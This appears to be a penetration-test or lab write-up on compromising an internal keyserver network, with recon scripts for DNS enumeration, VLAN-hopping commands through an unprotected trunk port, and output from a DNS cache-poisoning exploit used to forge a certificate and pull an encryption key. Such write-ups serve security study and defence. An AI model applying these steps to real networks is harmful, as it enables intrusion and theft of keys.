# Compromise keyserver network and extract cookie encryption key

## Reconnaissance

We begin our reconnaissance phase by enumerating DNS records for the `internal` TLD. We wrote the `dnscan.sh` utility to iterate over a wordlist and attempt an `A` query for each possible subdomain.

```bash
#!/bin/bash
# dnscan.sh
# Usage: ./dnscan.sh <domain> <wordlist>

# Check for 2 args
if [ $# -ne 2 ]; then
  echo "Usage: $0 <domain> <wordlist>"
  exit 1
fi

# For line in file
while read -r line; do
  {
    resp=$(dig +short @10.64.10.2 "$line.$1")
    if [ -n "$resp" ]; then
      echo "$line.$1 -> $resp"
    fi
  } &
done <$2
wait
```

We run `dnscan.sh` to begin subdomain enumeration for the `internal` TLD, providing a list of the [top 10,000 common subdomains](https://github.com/rbsec/dnscan).

```bash
pwn:~$ ./dnscan.sh internal subdomains-10000.txt 
api.internal -> 10.64.10.1
dns.internal -> 10.64.10.2
ca.internal -> 10.64.10.3
keyserver.internal -> 172.16.10.1
```

We see a few hosts within our local 10.64.10.x network, and `keyserver.internal` in another network.

Attempting a route lookup for `172.16.10.1` reveals that the host is unreachable from our network:

```
pwn:~$ ip route show 172.16.10.1
```

We continue by running a packet capture with VLAN decoding enabled to look for any traffic visible to our attacker machine:

```bash
pwn:~$ sudo tcpdump -i ens3 -n -e vlan
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on ens3, link-type EN10MB (Ethernet), capture size 262144 bytes
14:25:35.396015 52:54:00:00:05:36 > 33:33:00:00:00:02, ethertype 802.1Q (0x8100), length 74: vlan 10, p 0, ethertype IPv6, fe80::5054:ff:fe00:536 > ff02::2: ICMP6, router solicitation, length 16
```

After a few minutes, a 802.1Q frame appears on the wire, tagged with VLAN 10. This aligns with the common network practice of encoding a VLAN tag into the third octet of an IPv4 address; notably the 10 in `172.16.10.1`.

### Network Vulnerability 1: Unprotected trunk ports [V-NET-01]

Next, we create an interface to hop into VLAN 10:

```bash
pwn:~$ sudo ip link add link ens3 name ens3.10 type vlan id 10
pwn:~$ sudo ip addr  add dev ens3.10 172.16.10.200/24
pwn:~$ sudo ip link set dev ens3.10 up
```

The keyserver is now reachable:

```bash
pwn:~$ ping -c 1 keyserver.internal
PING keyserver.internal (172.16.10.1) 56(84) bytes of data.
64 bytes from 172.16.10.1 (172.16.10.1): icmp_seq=1 ttl=64 time=0.820 ms

--- keyserver.internal ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.820/0.820/0.820/0.000 ms
```

We continue enumerating the network by querying the 172.16.10.0/24 network for PTR records:

```bash
#!/bin/bash
# ptrecon.sh

for i in {0..255}; do
  {
    resp=$(dig +short -x "172.16.10.$i")
    if [ -n "$resp" ]; then
      echo "172.16.10.$i -> $resp"
    fi
  } &
done
wait
```

Running the `ptrecon.sh` script discovers a PTR record pointing `172.16.10.2` to `api.internal`:

```bash
pwn:~$ ./ptrecon.sh
172.16.10.1 -> keyserver.internal.
172.16.10.2 -> api.internal.
```

By this point it appears this network is intended for the API and keyserver to communicate directly.

Attempting to connect to the server throws a `bad certificate` error, likely meaning the client failed to provide a valid TLS certificate for mutual TLS authentication.

```bash
pwn:~$ curl https://keyserver.internal
curl: (56) OpenSSL SSL_read: error:14094412:SSL routines:ssl3_read_bytes:sslv3 alert bad certificate, errno 0
```

Using our V-CA-02 and V-CA-03 exploits from part 1, we're able to generate a certificate to impersonate the API and retry a request to the keyserver, this time authenticated as `api.internal`:

```bash
pwn:~$ sudo ./exploit -d api.internal
2022/11/08 19:15:57 Preparing DNS poisoner
2022/11/08 19:15:57 Creating pwn0 interface with 10.64.10.2
2022/11/08 19:15:57 Fetching validation token
2022/11/08 19:15:57 Serializing DNS packet
2022/11/08 19:15:57 Serialized DNS response for TXT [1f7b169c846f218ab552fa82fbf86758] id 11807
2022/11/08 19:15:57 Sending DNS responses to 10.64.10.3:50000
2022/11/08 19:15:57 Waiting for DNS cache poisoning
sud2022/11/08 19:15:58 Validating token with CA
2022/11/08 19:16:02 Wrote api.internal-crt.pem and api.internal-key.pem
2022/11/08 19:16:02 Stopped DNS poisoner
pwn:~$ curl https://keyserver.internal --key api.internal-key.pem --cert api.internal-crt.pem 
dce1360e4bc9a3a929a9dd5115e7977faac1f514febcf18fc036eebe3dffbc02
pwn:~$ curl https://keyserver.internal --key api.internal-key.pem --cert api.internal-crt.pem 
dce1360e4bc9a3a929a9dd5115e7977faac1f514febcf18fc036eebe3dffbc02
pwn:~$ curl https://keyserver.internal --key api.internal-key.pem --cert api.internal-crt.pem 
dce1360e4bc9a3a929a9dd5115e7977faac1f514febcf18fc036eebe3dffbc02
```

Retrying the request a few times returns the same 64 character hex string. This appears to be a key used by the API for encryption.
